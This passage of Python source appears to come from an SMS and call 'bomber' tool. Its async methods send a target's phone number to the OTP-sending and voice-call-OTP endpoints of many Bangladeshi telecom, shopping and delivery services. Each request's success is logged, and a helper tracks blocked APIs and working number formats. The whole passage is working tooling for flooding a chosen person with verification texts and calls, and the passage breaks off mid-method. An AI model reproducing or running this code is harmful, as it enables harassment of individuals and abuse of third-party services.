                    await self.log_event("API109 - Local OTP Send (103.4.145.86, fmt=current_api_fmt.get())", success, res.status, fmt=fmt)
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API109 - Local OTP Send (103.4.145.86, fmt=current_api_fmt.get())", success, res.status, fmt=fmt)
                    return success
        except Exception:
            await self.log_event("API109 - Local OTP Send (103.4.145.86, fmt=current_api_fmt.get())", False, "Error", fmt=fmt)
            return False

    @smart_api
    async def api_api113_bd_kepler_registration_otp(self):
        target = self.target
        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API113 - BD Kepler Registration OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API113 - BD Kepler Registration OTP": pass
            elif "Bioscope" in "API113 - BD Kepler Registration OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API113 - BD Kepler Registration OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API113 - BD Kepler Registration OTP": payload = {"phone": target}
            elif "Medha" in "API113 - BD Kepler Registration OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API113 - BD Kepler Registration OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API113 - BD Kepler Registration OTP": payload = {"phone_number": target}
            elif "Arogga" in "API113 - BD Kepler Registration OTP": payload = {"mobile": target}
            elif "MyGP" in "API113 - BD Kepler Registration OTP": pass
            elif "BDSTall" in "API113 - BD Kepler Registration OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API113 - BD Kepler Registration OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API113 - BD Kepler Registration OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API113 - BD Kepler Registration OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API113 - BD Kepler Registration OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API113 - BD Kepler Registration OTP": payload = {"mobile": target}
            elif "Kirei" in "API113 - BD Kepler Registration OTP": payload = {"phone": target}
            elif "Shikho" in "API113 - BD Kepler Registration OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API113 - BD Kepler Registration OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API113 - BD Kepler Registration OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API113 - BD Kepler Registration OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API113 - BD Kepler Registration OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api125_shadhin_music_otp_req(self):
        target = self.target
        url = "https://coreapi.shadhinmusic.com/api/v5/otp/otpreq"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API125 - Shadhin Music OTP Req": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API125 - Shadhin Music OTP Req": pass
            elif "Bioscope" in "API125 - Shadhin Music OTP Req": payload = {"number": "+88" + target}
            elif "Proiojon" in "API125 - Shadhin Music OTP Req": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API125 - Shadhin Music OTP Req": payload = {"phone": target}
            elif "Medha" in "API125 - Shadhin Music OTP Req": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API125 - Shadhin Music OTP Req": payload = {"number": "+88" + target}
            elif "Robi" in "API125 - Shadhin Music OTP Req": payload = {"phone_number": target}
            elif "Arogga" in "API125 - Shadhin Music OTP Req": payload = {"mobile": target}
            elif "MyGP" in "API125 - Shadhin Music OTP Req": pass
            elif "BDSTall" in "API125 - Shadhin Music OTP Req": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API125 - Shadhin Music OTP Req": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API125 - Shadhin Music OTP Req": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API125 - Shadhin Music OTP Req": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API125 - Shadhin Music OTP Req": payload = {"phoneNumber": target}
            elif "Sindabad" in "API125 - Shadhin Music OTP Req": payload = {"mobile": target}
            elif "Kirei" in "API125 - Shadhin Music OTP Req": payload = {"phone": target}
            elif "Shikho" in "API125 - Shadhin Music OTP Req": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API125 - Shadhin Music OTP Req": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API125 - Shadhin Music OTP Req", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API125 - Shadhin Music OTP Req", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API125 - Shadhin Music OTP Req", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api142_hishabee_number_check(self):
        target = self.target
        url = "https://distribution.hishabee.business/api/app/v1/auth/number-check"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API142 - Hishabee Number Check": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API142 - Hishabee Number Check": pass
            elif "Bioscope" in "API142 - Hishabee Number Check": payload = {"number": "+88" + target}
            elif "Proiojon" in "API142 - Hishabee Number Check": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API142 - Hishabee Number Check": payload = {"phone": target}
            elif "Medha" in "API142 - Hishabee Number Check": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API142 - Hishabee Number Check": payload = {"number": "+88" + target}
            elif "Robi" in "API142 - Hishabee Number Check": payload = {"phone_number": target}
            elif "Arogga" in "API142 - Hishabee Number Check": payload = {"mobile": target}
            elif "MyGP" in "API142 - Hishabee Number Check": pass
            elif "BDSTall" in "API142 - Hishabee Number Check": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API142 - Hishabee Number Check": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API142 - Hishabee Number Check": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API142 - Hishabee Number Check": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API142 - Hishabee Number Check": payload = {"phoneNumber": target}
            elif "Sindabad" in "API142 - Hishabee Number Check": payload = {"mobile": target}
            elif "Kirei" in "API142 - Hishabee Number Check": payload = {"phone": target}
            elif "Shikho" in "API142 - Hishabee Number Check": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API142 - Hishabee Number Check": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API142 - Hishabee Number Check", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API142 - Hishabee Number Check", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API142 - Hishabee Number Check", False, "Error", fmt=current_api_fmt.get())
            return False

    # Call APIs

    @smart_api
    async def api_call1___robi_call_otp(self):
        api_name = "Call1 - Robi Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.robi.com.bd/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL1 - Robi Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL1 - Robi Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call2___daraz_call_otp(self):
        api_name = "Call2 - Daraz Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.daraz.com.bd/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL2 - Daraz Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL2 - Daraz Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call3___pathao_call_otp(self):
        api_name = "Call3 - Pathao Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.pathao.com/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL3 - Pathao Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL3 - Pathao Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call4___shohoz_call_otp(self):
        api_name = "Call4 - Shohoz Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.shohoz.com/v1/auth/call-otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL4 - Shohoz Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL4 - Shohoz Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call5___chaldal_call_otp(self):
        api_name = "Call5 - Chaldal Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://chaldal.com/api/customer/SendVoiceOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL5 - Chaldal Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL5 - Chaldal Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call6___foodpanda_call_otp(self):
        api_name = "Call6 - Foodpanda Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.foodpanda.com.bd/api/v1/otp/send-voice"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL6 - Foodpanda Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL6 - Foodpanda Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call7___evaly_call_otp(self):
        api_name = "Call7 - Evaly Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL7 - Evaly Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL7 - Evaly Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call8___hungrynaki_call_otp(self):
        api_name = "Call8 - Hungrynaki Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL8 - HungryNaki Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL8 - HungryNaki Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call9___rokomari_call_otp(self):
        api_name = "Call9 - Rokomari Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.rokomari.com/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target, "type": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL9 - Rokomari Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL9 - Rokomari Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call10___airtel_call_otp(self):
        api_name = "Call10 - Airtel Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.airtel.com.bd/vas/v1/otp/send"
        try:
            async with self.session.post(url, json={"msisdn": target, "type": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL10 - Airtel Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL10 - Airtel Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call11___gp_call_otp_v2(self):
        api_name = "Call11 - Gp Call Otp V2"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.grameenphone.com/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"phone": target, "method": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL11 - GP Call OTP V2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL11 - GP Call OTP V2", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call12___extra_call_api_12(self):
        api_name = "Call12 - Extra Call 12"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[12 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL12 - Extra API 12", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL12 - Extra API 12", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call13___extra_call_api_13(self):
        api_name = "Call13 - Extra Call 13"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[13 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL13 - Extra API 13", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL13 - Extra API 13", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call14___extra_call_api_14(self):
        api_name = "Call14 - Extra Call 14"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[14 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL14 - Extra API 14", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL14 - Extra API 14", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call15___extra_call_api_15(self):
        api_name = "Call15 - Extra Call 15"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[15 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL15 - Extra API 15", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL15 - Extra API 15", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call16___extra_call_api_16(self):
        api_name = "Call16 - Extra Call 16"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[16 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL16 - Extra API 16", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL16 - Extra API 16", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call17___extra_call_api_17(self):
        api_name = "Call17 - Extra Call 17"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[17 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL17 - Extra API 17", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL17 - Extra API 17", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call18___extra_call_api_18(self):
        api_name = "Call18 - Extra Call 18"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[18 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL18 - Extra API 18", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL18 - Extra API 18", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call19___extra_call_api_19(self):
        api_name = "Call19 - Extra Call 19"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[19 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL19 - Extra API 19", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL19 - Extra API 19", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call20___extra_call_api_20(self):
        api_name = "Call20 - Extra Call 20"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[20 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL20 - Extra API 20", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL20 - Extra API 20", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call21___extra_call_api_21(self):
        api_name = "Call21 - Extra Call 21"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[21 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL21 - Extra API 21", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL21 - Extra API 21", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call22___extra_call_api_22(self):
        api_name = "Call22 - Extra Call 22"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[22 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL22 - Extra API 22", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL22 - Extra API 22", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call23___extra_call_api_23(self):
        api_name = "Call23 - Extra Call 23"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[23 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL23 - Extra API 23", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL23 - Extra API 23", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call24___extra_call_api_24(self):
        api_name = "Call24 - Extra Call 24"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
